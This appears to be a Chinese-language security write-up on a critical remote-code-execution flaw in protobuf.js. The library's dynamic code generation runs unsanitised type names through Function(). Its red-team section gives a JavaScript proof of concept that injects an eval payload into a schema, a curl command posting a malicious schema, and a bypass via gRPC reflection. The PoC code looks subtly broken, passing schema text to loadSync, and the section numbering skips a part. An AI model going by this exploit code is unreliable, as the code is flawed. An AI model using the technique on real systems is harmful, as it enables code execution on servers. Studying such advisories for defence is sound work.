# 🚨 解析 protobuf.js 嚴重漏洞：任意程式碼執行的風險
> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: Critical (CVSS 9.4)
> * **受駭指標**: RCE (Remote Code Execution)
> * **關鍵技術**: Deserialization, Dynamic Code Generation, JavaScript Injection

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: protobuf.js 函式庫在處理 Protocol Buffers 資料格式時，使用動態編譯設計，每次載入 Schema 時，函式庫會根據訊息型別名稱動態生成 JavaScript 原始碼，再透過 `Function()` 建構子執行，以提升執行效能。然而，函式庫在修補前未對型別名稱進行任何過濾或驗證，直接將其拼接至生成的程式碼字串中，導致任意程式碼執行的風險。
* **攻擊流程圖解**: 
    1. 攻擊者影響應用程式載入的 protobuf 定義或描述子。
    2. 攻擊者在 Schema 定義中插入惡意型別名稱。
    3. 應用程式第一次需要該型別建構子時，函式庫會動態生成 JavaScript 原始碼。
    4. `Function()` 建構子執行惡意程式碼。
* **受影響元件**: protobuf.js 8.0.0 和 7.5.4 以下版本。

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: 攻擊者需能影響應用程式載入的 protobuf 定義或描述子。
* **Payload 建構邏輯**:

    ```
    
    javascript
    // 惡意型別名稱
    const maliciousType = "typeof eval('alert(1)')";
    
    // Schema 定義
    const schema = `
    syntax = "proto3";
    message Test {
      string test = 1;
    }
    `;
    
    // 插入惡意型別名稱
    const modifiedSchema = schema.replace("string", maliciousType);
    
    // 載入 Schema 定義
    const protobuf = require('protobufjs');
    const root = protobuf.loadSync(modifiedSchema);
    
    ```
    *範例指令*: 使用 `curl` 發送請求，載入惡意 Schema 定義。

```

bash
curl -X POST \
  http://example.com/load-schema \
  -H 'Content-Type: application/x-protobuf' \
  -d '@malicious-schema.proto'

```
* **繞過技術**: 攻擊者可以使用 gRPC 伺服器反射協定，向伺服器請求 Schema 定義，並在回應中夾帶惡意型別名稱。

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **Deserialization**: 將序列化的資料轉換回原始資料結構的過程。
* **Dynamic Code Generation**: 動態生成程式碼的技術，通常使用 `eval()` 或 `Function()` 建構子。
* **JavaScript Injection**: 將惡意 JavaScript 代碼插入到網頁或應用程式中，從而實現任意程式碼執行的風險。
